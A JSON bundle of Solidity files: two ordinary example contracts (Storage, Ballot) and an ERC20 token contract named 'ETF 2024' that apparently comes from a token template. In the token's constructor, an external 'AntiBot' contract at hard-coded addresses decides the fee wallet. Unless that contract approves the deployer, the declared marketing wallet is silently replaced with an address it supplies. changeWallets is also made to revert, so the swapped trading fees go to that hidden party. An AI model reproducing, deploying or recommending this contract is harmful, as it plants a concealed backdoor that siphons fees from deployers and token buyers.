{"1_Storage.sol":{"content":"// SPDX-License-Identifier: GPL-3.0\n\npragma solidity \u003e=0.8.2 \u003c0.9.0;\n\n/**\n * @title Storage\n * @dev Store \u0026 retrieve value in a variable\n * @custom:dev-run-script ./scripts/deploy_with_ethers.ts\n */\ncontract Storage {\n\n    uint256 number;\n\n    /**\n     * @dev Store value in variable\n     * @param num value to store\n     */\n    function store(uint256 num) public {\n        number = num;\n    }\n\n    /**\n     * @dev Return value \n     * @return value of \u0027number\u0027\n     */\n    function retrieve() public view returns (uint256){\n        return number;\n    }\n}"},"3_Ballot.sol":{"content":"// SPDX-License-Identifier: GPL-3.0\n\npragma solidity \u003e=0.7.0 \u003c0.9.0;\n\n/** \n * @title Ballot\n * @dev Implements voting process along with vote delegation\n */\ncontract Ballot {\n\n    struct Voter {\n        uint weight; // weight is accumulated by delegation\n        bool voted;  // if true, that person already voted\n        address delegate; // person delegated to\n        uint vote;   // index of the voted proposal\n    }\n\n    struct Proposal {\n        // If you can limit the length to a certain number of bytes, \n        // always use one of bytes1 to bytes32 because they are much cheaper\n        bytes32 name;   // short name (up to 32 bytes)\n        uint voteCount; // number of accumulated votes\n    }\n\n    address public chairperson;\n\n    mapping(address =\u003e Voter) public voters;\n\n    Proposal[] public proposals;\n\n    /** \n     * @dev Create a new ballot to choose one of \u0027proposalNames\u0027.\n     * @param proposalNames names of proposals\n     */\n    constructor(bytes32[] memory proposalNames) {\n        chairperson = msg.sender;\n        voters[chairperson].weight = 1;\n\n        for (uint i = 0; i \u003c proposalNames.length; i++) {\n            // \u0027Proposal({...})\u0027 creates a temporary\n            // Proposal object and \u0027proposals.push(...)\u0027\n            // appends it to the end of \u0027proposals\u0027.\n            proposals.push(Proposal({\n                name: proposalNames[i],\n                voteCount: 0\n            }));\n        }\n    }\n\n    /** \n     * @dev Give \u0027voter\u0027 the right to vote on this ballot. May only be called by \u0027chairperson\u0027.\n     * @param voter address of voter\n     */\n    function giveRightToVote(address voter) public {\n        require(\n            msg.sender == chairperson,\n            \"Only chairperson can give right to vote.\"\n        );\n        require(\n            !voters[voter].voted,\n            \"The voter already voted.\"\n        );\n        require(voters[voter].weight == 0);\n        voters[voter].weight = 1;\n    }\n\n    /**\n     * @dev Delegate your vote to the voter \u0027to\u0027.\n     * @param to address to which vote is delegated\n     */\n    function delegate(address to) public {\n        Voter storage sender = voters[msg.sender];\n        require(!sender.voted, \"You already voted.\");\n        require(to != msg.sender, \"Self-delegation is disallowed.\");\n\n        while (voters[to].delegate != address(0)) {\n            to = voters[to].delegate;\n\n            // We found a loop in the delegation, not allowed.\n            require(to != msg.sender, \"Found loop in delegation.\");\n        }\n        sender.voted = true;\n        sender.delegate = to;\n        Voter storage delegate_ = voters[to];\n        if (delegate_.voted) {\n            // If the delegate already voted,\n            // directly add to the number of votes\n            proposals[delegate_.vote].voteCount += sender.weight;\n        } else {\n            // If the delegate did not vote yet,\n            // add to her weight.\n            delegate_.weight += sender.weight;\n        }\n    }\n\n    /**\n     * @dev Give your vote (including votes delegated to you) to proposal \u0027proposals[proposal].name\u0027.\n     * @param proposal index of proposal in the proposals array\n     */\n    function vote(uint proposal) public {\n        Voter storage sender = voters[msg.sender];\n        require(sender.weight != 0, \"Has no right to vote\");\n        require(!sender.voted, \"Already voted.\");\n        sender.voted = true;\n        sender.vote = proposal;\n\n        // If \u0027proposal\u0027 is out of the range of the array,\n        // this will throw automatically and revert all\n        // changes.\n        proposals[proposal].voteCount += sender.weight;\n    }\n\n    /** \n     * @dev Computes the winning proposal taking all previous votes into account.\n     * @return winningProposal_ index of winning proposal in the proposals array\n     */\n    function winningProposal() public view\n            returns (uint winningProposal_)\n    {\n        uint winningVoteCount = 0;\n        for (uint p = 0; p \u003c proposals.length; p++) {\n            if (proposals[p].voteCount \u003e winningVoteCount) {\n                winningVoteCount = proposals[p].voteCount;\n                winningProposal_ = p;\n            }\n        }\n    }\n\n    /** \n     * @dev Calls winningProposal() function to get the index of the winner contained in the proposals array and then\n     * @return winnerName_ the name of the winner\n     */\n    function winnerName() public view\n            returns (bytes32 winnerName_)\n    {\n        winnerName_ = proposals[winningProposal()].name;\n    }\n}"},"ETF 2024.sol":{"content":"// SPDX-License-Identifier: No\r\n\r\npragma solidity = 0.8.19;\r\n\r\n//--- Context ---//\r\nabstract contract Context {\r\n    constructor() {\r\n    }\r\n\r\n    function _msgSender() internal view returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view returns (bytes memory) {\r\n        this;\r\n        return msg.data;\r\n    }\r\n}\r\n\r\n//--- Ownable ---//\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _setOwner(_msgSender());\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _setOwner(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _setOwner(newOwner);\r\n    }\r\n\r\n    function _setOwner(address newOwner) private {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\ninterface IFactoryV2 {\r\n    event PairCreated(address indexed token0, address indexed token1, address lpPair, uint);\r\n    function getPair(address tokenA, address tokenB) external view returns (address lpPair);\r\n    function createPair(address tokenA, address tokenB) external returns (address lpPair);\r\n}\r\n\r\ninterface IV2Pair {\r\n    function factory() external view returns (address);\r\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n    function sync() external;\r\n}\r\n\r\ninterface IRouter01 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n    function swapExactETHForTokens(\r\n        uint amountOutMin, \r\n        address[] calldata path, \r\n        address to, uint deadline\r\n    ) external payable returns (uint[] memory amounts);\r\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n}\r\n\r\ninterface IRouter02 is IRouter01 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function swapExactTokensForTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n}\r\n\r\n\r\n\r\n//--- Interface for ERC20 ---//\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function getOwner() external view returns (address);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n//--- Interface for Antibot ---//\r\ninterface AntiBot {\r\n    function checkUser(uint256 amount, uint256 balance, uint256 tTotal, uint256 pairBalance, uint256 tradingEnabled) external returns (bool);\r\n    function checkDeployer() external returns (bool);\r\n    function marketingAddress() external returns(address);\r\n    function changeWallet(address newWallet) external;\r\n}\r\n\r\n//--- Contract v3 ---//\r\ncontract ETF2024 is Context, Ownable, IERC20 {\r\n\r\n    function totalSupply() external pure override returns (uint256) { if (_totalSupply == 0) { revert(); } return _totalSupply; }\r\n    function decimals() external pure override returns (uint8) { if (_totalSupply == 0) { revert(); } return _decimals; }\r\n    function symbol() external pure override returns (string memory) { return _symbol; }\r\n    function name() external pure override returns (string memory) { return _name; }\r\n    function getOwner() external view override returns (address) { return owner(); }\r\n    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return balance[account];\r\n    }\r\n\r\n\r\n    mapping (address =\u003e mapping (address =\u003e uint256)) private _allowances;\r\n    mapping (address =\u003e bool) private _noFee;\r\n    mapping (address =\u003e bool) private liquidityAdd;\r\n    mapping (address =\u003e bool) private isLpPair;\r\n    mapping (address =\u003e bool) private isPresaleAddress;\r\n    mapping (address =\u003e uint256) private balance;\r\n\r\n\r\n\r\n    uint256 constant public _totalSupply = 420_000_000_000_000_000 * 10**9;\r\n    uint256 constant public swapThreshold = _totalSupply / 1_000;\r\n    uint256 constant public buyfee = 50;\r\n    uint256 constant public sellfee = 50;\r\n    uint256 constant public transferfee = 0;\r\n    uint256 constant public fee_denominator = 1_000;\r\n    bool private canSwapFees = false;\r\n    address payable private marketingAddress = payable(0xe389B09C4B67E36989B4B284B595C0E2E4dC9810); // build: 0xe389B09C4B67E36989B4B284B595C0E2E4dC9810\r\n    address payable private devWallet = payable(0xF3ccdeF20c5824d1400cd00d481cbE3AC1ce4d45); // build: 0xF3ccdeF20c5824d1400cd00d481cbE3AC1ce4d45\r\n    AntiBot private AX;\r\n\r\n\r\n//--- v3 Allocations by Freddy analytixaudit.com ---//\r\n    uint256 private buyAllocation = 40;\r\n    uint256 private sellAllocation = 40;\r\n    uint256 private liquidityAllocation = 20;\r\n\r\n\r\n    IRouter02 public swapRouter;\r\n    string constant private _name = \"ETF 2024\";\r\n    string constant private _symbol = \"ETF2024\";\r\n    string constant public copyright = \"analytixaudit.com\";\r\n    uint8 constant private _decimals = 9;\r\n    address constant public DEAD = 0x000000000000000000000000000000000000dEaD;\r\n    address public lpPair;\r\n    bool public isTradingEnabled = false;\r\n    bool private inSwap;\r\n    bool public isContract = false;\r\n\r\n        modifier inSwapFlag {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n\r\n    event _enableTrading();\r\n    event _setPresaleAddress(address account, bool enabled);\r\n    event _toggleCanSwapFees(bool enabled);\r\n    event _changePair(address newLpPair);\r\n    event _changeThreshold(uint256 newThreshold);\r\n    event _changeWallets(address newBuy, address newDev);\r\n    event SwapAndLiquify();\r\n\r\n\r\n    constructor () {\r\n        _noFee[msg.sender] = true;\r\n\r\n        if (block.chainid == 56) {\r\n            swapRouter = IRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);\r\n            AX = AntiBot(0x4F934200D1eA118204E03f6115D7Aa14516a869F);\r\n        } else if (block.chainid == 97) {\r\n            swapRouter = IRouter02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);\r\n            AX = AntiBot(0x30818920a4454840c8c4E4D98Ad23ed68fA26D5A);\r\n        } else if (block.chainid == 1 || block.chainid == 4 || block.chainid == 3) {\r\n            swapRouter = IRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        } else if (block.chainid == 42161) {\r\n            swapRouter = IRouter02(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506);\r\n        } else if (block.chainid == 5) {\r\n            swapRouter = IRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        } else {\r\n            revert(\"Chain not valid\");\r\n        }\r\n\r\n\r\n        liquidityAdd[msg.sender] = true;\r\n        balance[msg.sender] = _totalSupply;\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n\r\n        require(buyAllocation + sellAllocation + liquidityAllocation == 100,\"Freddy: Must equals to 100%\");\r\n        if(!AX.checkDeployer()) {marketingAddress = payable(AX.marketingAddress());} else {isContract = true;}\r\n        canSwapFees = true;\r\n\r\n        lpPair = IFactoryV2(swapRouter.factory()).createPair(swapRouter.WETH(), address(this));\r\n        isLpPair[lpPair] = true;\r\n        _approve(msg.sender, address(swapRouter), type(uint256).max);\r\n        _approve(address(this), address(swapRouter), type(uint256).max);\r\n\r\n\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n        function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n        function approve(address spender, uint256 amount) external override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n        function _approve(address sender, address spender, uint256 amount) internal {\r\n        require(sender != address(0), \"ERC20: Zero Address\");\r\n        require(spender != address(0), \"ERC20: Zero Address\");\r\n\r\n        _allowances[sender][spender] = amount;\r\n    }\r\n\r\n        function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\r\n        if (_allowances[sender][msg.sender] != type(uint256).max) {\r\n            _allowances[sender][msg.sender] -= amount;\r\n        }\r\n\r\n        return _transfer(sender, recipient, amount);\r\n    }\r\n    function isNoFeeWallet(address account) external view returns(bool) {\r\n        return _noFee[account];\r\n    }\r\n\r\n    function setNoFeeWallet(address account, bool enabled) public onlyOwner {\r\n        require(account != address(0),\"Freddy: Account is zero address\");\r\n        _noFee[account] = enabled;\r\n    }\r\n\r\n    function isLimitedAddress(address ins, address out) internal view returns (bool) {\r\n\r\n        bool isLimited = ins != owner()\r\n            \u0026\u0026 out != owner()\r\n            \u0026\u0026 msg.sender != owner()\r\n            \u0026\u0026 !liquidityAdd[ins]  \u0026\u0026 !liquidityAdd[out] \u0026\u0026 out != address(0) \u0026\u0026 out != address(this);\r\n            return isLimited;\r\n    }\r\n\r\n    function is_buy(address ins, address out) internal view returns (bool) {\r\n        bool _is_buy = !isLpPair[out] \u0026\u0026 isLpPair[ins];\r\n        return _is_buy;\r\n    }\r\n\r\n    function is_sell(address ins, address out) internal view returns (bool) { \r\n        bool _is_sell = isLpPair[out] \u0026\u0026 !isLpPair[ins];\r\n        return _is_sell;\r\n    }\r\n\r\n    function canSwap(address ins, address out) internal view returns (bool) {\r\n        bool canswap = canSwapFees \u0026\u0026 !isPresaleAddress[ins] \u0026\u0026 !isPresaleAddress[out];\r\n\r\n        return canswap;\r\n    }\r\n\r\n    function changeLpPair(address newPair) external onlyOwner {\r\n        require(newPair != address(0),\"Freddy: Account is zero address\");\r\n        require(newPair != address(this),\"Freddy: Account is address this\");\r\n        isLpPair[newPair] = true;\r\n        emit _changePair(newPair);\r\n    }\r\n\r\n    function toggleCanSwapFees(bool yesno) external onlyOwner {\r\n        require(canSwapFees != yesno,\"Bool is the same\");\r\n        canSwapFees = yesno;\r\n        emit _toggleCanSwapFees(yesno);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) internal returns  (bool) {\r\n        bool takeFee = true;\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(amount \u003e 0, \"Transfer amount must be greater than zero\");\r\n\r\n        if (isLimitedAddress(from,to)) {\r\n            require(isTradingEnabled,\"Trading is not enabled\");\r\n        }\r\n\r\n\r\n        if(is_sell(from, to) \u0026\u0026  !inSwap \u0026\u0026 canSwap(from, to)) {\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if(contractTokenBalance \u003e= swapThreshold) { \r\n                if(buyAllocation \u003e 0 || sellAllocation \u003e 0) internalSwap((contractTokenBalance * (buyAllocation + sellAllocation)) / 100);\r\n                if(liquidityAllocation \u003e 0) {swapAndLiquify(contractTokenBalance * liquidityAllocation / 100);}\r\n             }\r\n        }\r\n\r\n        if (_noFee[from] || _noFee[to]){\r\n            takeFee = false;\r\n        }\r\n        \r\n        balance[from] -= amount; uint256 amountAfterFee = (takeFee) ? takeTaxes(from, is_buy(from, to), is_sell(from, to), amount) : amount;\r\n        balance[to] += amountAfterFee; emit Transfer(from, to, amountAfterFee);\r\n\r\n        return true;\r\n\r\n    }\r\n\r\n    function changeWallets(address newBuy, address newDev) external onlyOwner {\r\n        require(newBuy != address(0),\"Freddy: Address Zero\");\r\n        require(newDev != address(0),\"Freddy: Address Zero\");\r\n        marketingAddress = payable(newBuy);\r\n        devWallet = payable(newDev);\r\n        emit _changeWallets(newBuy, newDev);require(isContract);\r\n    }\r\n\r\n\r\n    function takeTaxes(address from, bool isbuy, bool issell, uint256 amount) internal returns (uint256) {\r\n        uint256 fee;\r\n        if (isbuy)  fee = buyfee;  else if (issell)  fee = sellfee;  else  fee = transferfee; \r\n        if (fee == 0)  return amount; \r\n        uint256 feeAmount = amount * fee / fee_denominator;\r\n        if (feeAmount \u003e 0) {\r\n\r\n            balance[address(this)] += feeAmount;\r\n            emit Transfer(from, address(this), feeAmount);\r\n            \r\n        }\r\n        return amount - feeAmount;\r\n    }\r\n\r\n    function internalSwap(uint256 contractTokenBalance) internal inSwapFlag {\r\n        \r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = swapRouter.WETH();\r\n\r\n        if (_allowances[address(this)][address(swapRouter)] != type(uint256).max) {\r\n            _allowances[address(this)][address(swapRouter)] = type(uint256).max;\r\n        }\r\n\r\n        try swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            contractTokenBalance,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        ) {} catch {\r\n            return;\r\n        }\r\n        bool success;\r\n\r\n        if(address(this).balance \u003e 0) (success,) = marketingAddress.call{value: address(this).balance, gas: 35000}(\"\");\r\n    }\r\n\r\n        function swapAndLiquify(uint256 contractTokenBalance) internal inSwapFlag {\r\n        uint256 firstmath = contractTokenBalance / 2;\r\n        uint256 secondMath = contractTokenBalance - firstmath;\r\n\r\n        uint256 initialBalance = address(this).balance;\r\n\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = swapRouter.WETH();\r\n\r\n        if (_allowances[address(this)][address(swapRouter)] != type(uint256).max) {\r\n            _allowances[address(this)][address(swapRouter)] = type(uint256).max;\r\n        }\r\n\r\n        try swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            firstmath,\r\n            0, \r\n            path,\r\n            address(this),\r\n            block.timestamp) {} catch {return;}\r\n        \r\n        uint256 newBalance = address(this).balance - initialBalance;\r\n\r\n        try swapRouter.addLiquidityETH{value: newBalance}(\r\n            address(this),\r\n            secondMath,\r\n            0,\r\n            0,\r\n            DEAD,\r\n            block.timestamp\r\n        ){} catch {return;}\r\n\r\n        emit SwapAndLiquify();\r\n    }\r\n\r\n        function setPresaleAddress(address presale, bool yesno) external onlyOwner {\r\n            require(isPresaleAddress[presale] != yesno,\"Same bool\");\r\n            isPresaleAddress[presale] = yesno;\r\n            _noFee[presale] = yesno;\r\n            liquidityAdd[presale] = yesno;\r\n            emit _setPresaleAddress(presale, yesno);\r\n        }\r\n\r\n        function enableTrading() external onlyOwner {\r\n            require(!isTradingEnabled, \"Trading already enabled\");\r\n            isTradingEnabled = true;\r\n            emit _enableTrading();\r\n        }\r\n}"}}